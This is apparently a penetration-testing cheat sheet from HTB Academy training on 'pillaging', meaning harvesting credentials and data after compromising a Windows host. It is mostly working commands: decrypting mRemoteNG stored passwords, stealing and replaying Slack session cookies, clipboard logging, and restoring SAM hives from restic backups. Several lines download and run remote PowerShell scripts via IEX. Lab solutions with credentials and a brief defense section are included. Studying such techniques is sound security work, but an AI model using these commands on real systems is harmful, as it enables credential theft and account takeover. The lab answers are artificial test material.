# Pillaging

## 🎯 Overview

**Pillaging** is the systematic process of **data extraction** from compromised systems to gather **credentials**, **sensitive information**, and **intelligence** for further network access. Focus on **installed applications**, **configuration files**, **browser data**, **clipboard content**, and **backup systems** for maximum information yield.

## 📊 Data Sources for Pillaging

### Primary Targets
```cmd
# High-value data sources:
- Installed applications & services
- File shares & databases  
- Directory services (Active Directory)
- Certificate authorities
- Source code management servers
- Backup & monitoring systems
- Web browsers & IM clients
- History files & documents
- Network infrastructure details
```

### Information Categories
```cmd
# Types of valuable data:
- Personal information (PII)
- Corporate blueprints & intellectual property
- Credit card & financial data
- Server & infrastructure information
- Network topology & credentials
- Passwords & authentication tokens
- Previous audit reports
- User roles & privileges
```

## 💻 Installed Application Enumeration

### Directory-Based Discovery
```cmd
# Quick application enumeration:
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Look for:
- Remote management tools (mRemoteNG, TeamViewer)
- Development tools (Git, IDEs)
- Database clients (SSMS, MySQL Workbench)
- VPN clients (OpenVPN, Cisco AnyConnect)
- Password managers (KeePass, 1Password)
```

### Registry-Based Enumeration
```powershell
# Comprehensive installed programs list:
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

## 🔧 mRemoteNG Exploitation

### Configuration File Location
```cmd
# Default mRemoteNG config location:
%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml

# Check for mRemoteNG installation:
ls "C:\Program Files\mRemoteNG"
ls C:\Users\*\AppData\Roaming\mRemoteNG
```

### Configuration File Structure
```xml
<!-- Example confCons.xml with default master password -->
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" Port="3389" />
</mrng:Connections>
```

### Password Decryption
```bash
# Default master password decryption (hardcoded: "mR3m"):
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="

# Result: ASDki230kasd09fk233aDA

# Custom master password decryption:
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p admin

# Brute force master password:
for password in $(cat /usr/share/wordlists/fasttrack.txt); do 
    echo $password
    python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $password 2>/dev/null
done
```

## 🍪 Browser Cookie Extraction

### Firefox Cookie Extraction
```powershell
# Copy Firefox cookies database:
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

# Extract specific cookies (Linux):
python3 cookieextractor.py --dbpath "/home/user/cookies.sqlite" --host slack --cookie d

# Example Slack cookie:
d=xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSC...
```

### Chrome Cookie Extraction
```powershell
# Chrome cookies are DPAPI encrypted
# Copy cookies to expected SharpChromium location:
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

# Use Invoke-SharpChromium for decryption:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"

# Extract 'd' cookie value from JSON output
```

### Cookie Abuse for IM Access
```cmd
# Using Cookie-Editor browser extension:
1. Navigate to target website (slack.com)
2. Open Cookie-Editor extension
3. Modify 'd' cookie with extracted value
4. Save cookie changes
5. Refresh page = authenticated access

# Target applications:
- Slack (cookie: d)
- Microsoft Teams
- Discord
- Other web-based IM clients
```

## 📋 Clipboard Monitoring

### PowerShell Clipboard Logger
```powershell
# Monitor clipboard for credentials:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger

# Example captured data:
https://portal.azure.com
Administrator@something.com
Sup9rC0mpl2xPa$$ws0921lk
```

### Clipboard Target Data
```cmd
# Common clipboard contents:
- Passwords from password managers
- 2FA tokens & soft tokens
- Database connection strings
- API keys & authentication tokens
- RDP session clipboard data
- Copy-pasted credentials
```

## 💾 Backup System Exploitation

### Restic Backup System
```cmd
# Restic backup locations:
C:\Windows\System32\restic.exe    # Common installation
E:\restic\                        # Repository location

# Environment variable check:
echo $env:RESTIC_PASSWORD

# Repository operations:
restic.exe -r E:\restic2 snapshots    # List backups
restic.exe -r E:\restic2 restore <ID> --target C:\Restore
```

### Backup Repository Enumeration
```powershell
# Initialize repository access:
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2 init

# Create backups with VSS:
restic.exe -r E:\restic2 backup C:\Windows\System32\config --use-fs-snapshot

# Restore specific snapshots:
restic.exe -r E:\restic2 restore 9971e881 --target C:\Restore
```

### Backup Target Analysis
```cmd
# Windows backup targets:
C:\Windows\System32\config\SAM     # Local account hashes
C:\Windows\System32\config\SYSTEM  # System hive
C:\inetpub\wwwroot\web.config      # IIS application configs
C:\Program Files\*\config\         # Application configurations
C:\Users\*\.ssh\                   # SSH keys
C:\Users\*\Documents\              # User documents

# Linux backup targets:
/etc/shadow                        # User password hashes
/etc/passwd                        # User accounts
/home/*/.ssh/                      # SSH keys
/var/www/html/                     # Web applications
/opt/*/config/                     # Application configs
```

## 🎯 HTB Academy Lab Solutions

### Lab Environment Access
```cmd
# Various user credentials:
Peter:Bambi123           # Lab 1-2
Grace:<to_be_found>      # Lab 3  
Jeff:<to_be_found>       # Lab 4-5
```

### Lab 1: Application Identification
```cmd
# Objective: Identify remote management application
# Method: Application enumeration

# RDP as Peter:Bambi123
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Expected result: mRemoteNG
# Answer: mRemoteNG
```

### Lab 2: mRemoteNG Password Extraction
```cmd
# Objective: Extract Grace's password from mRemoteNG
# Method: confCons.xml decryption

# Find config file:
ls C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml

# Extract password hash from XML
# Use mremoteng_decrypt.py:
python3 mremoteng_decrypt.py -s "<Grace_password_hash>"

# Expected result: Grace's cleartext password
```

### Lab 3: Slack Cookie Extraction
```cmd
# Objective: Extract Slack cookie for slacktestapp.com
# Method: Browser cookie extraction as Grace

# Firefox method:
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath "cookies.sqlite" --host slacktestapp.com --cookie d

# Chrome method:
Invoke-SharpChromium -Command "cookies slacktestapp.com"

# Use Cookie-Editor to authenticate and get flag
```

### Lab 4: Restic Password Discovery
```cmd
# Objective: Find restic backup password as Jeff
# Method: Environment variables, config files, credential hunting

# Check environment:
echo $env:RESTIC_PASSWORD

# Search for restic configs:
findstr /SIM /C:"restic" *.txt *.ini *.cfg *.config
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config

# Expected result: Restic repository password
```

### Lab 5: Administrator Hash Extraction
```cmd
# Objective: Extract Administrator hash from backup
# Method: Restic restore + SAM/SYSTEM extraction

# Restore backup containing SAM/SYSTEM:
$env:RESTIC_PASSWORD = '<discovered_password>'
restic.exe -r <repository_path> snapshots
restic.exe -r <repository_path> restore <snapshot_id> --target C:\Restore

# Navigate to restored Windows config:
cd C:\Restore\C\Windows\System32\config

# Extract hashes (use impacket or similar):
# SAM + SYSTEM files = local account hashes
# Expected result: Administrator NTLM hash
```

## 🔄 Comprehensive Pillaging Strategy

### Systematic Approach
```cmd
# 1. Application enumeration
dir "C:\Program Files*"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

# 2. Configuration file hunting
findstr /SIM /C:"password" *.xml *.config *.ini *.txt

# 3. Browser data extraction
# Firefox: cookies.sqlite
# Chrome: Invoke-SharpChromium

# 4. Clipboard monitoring
Invoke-ClipboardLogger

# 5. Backup system enumeration
# Look for restic, Veeam, Acronis, etc.

# 6. Remote management tools
# mRemoteNG, TeamViewer, VNC configs
```

### Automation Tools
```cmd
# Comprehensive extraction tools:
.\LaZagne.exe all              # Multi-application credential extraction
Invoke-SessionGopher           # Remote access tool credentials  
.\SharpChromium.exe cookies    # Browser cookie extraction
Invoke-ClipboardLogger         # Real-time clipboard monitoring
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Browser database file access
- mRemoteNG configuration file access
- Clipboard monitoring script execution
- Backup system enumeration
- Cookie extraction tool usage
- Unusual file system searches
- Registry queries for application data
```

### Defensive Measures
```cmd
# Security recommendations:
- Encrypt mRemoteNG configurations with strong passwords
- Implement browser security policies
- Monitor backup system access
- Clipboard data protection
- Application configuration file permissions
- Regular security awareness training
- Network segmentation for backup systems
```

## 💡 Key Takeaways

1. **Systematic enumeration** of installed applications reveals attack vectors
2. **mRemoteNG** often stores credentials with weak/default encryption
3. **Browser cookies** provide direct access to web applications
4. **Clipboard monitoring** captures password manager usage
5. **Backup systems** contain copies of sensitive system files
6. **Multiple data sources** require comprehensive extraction strategy
7. **Automation tools** essential for efficient pillaging operations

---

*Pillaging transforms initial system access into comprehensive intelligence gathering for network expansion and objective completion.* 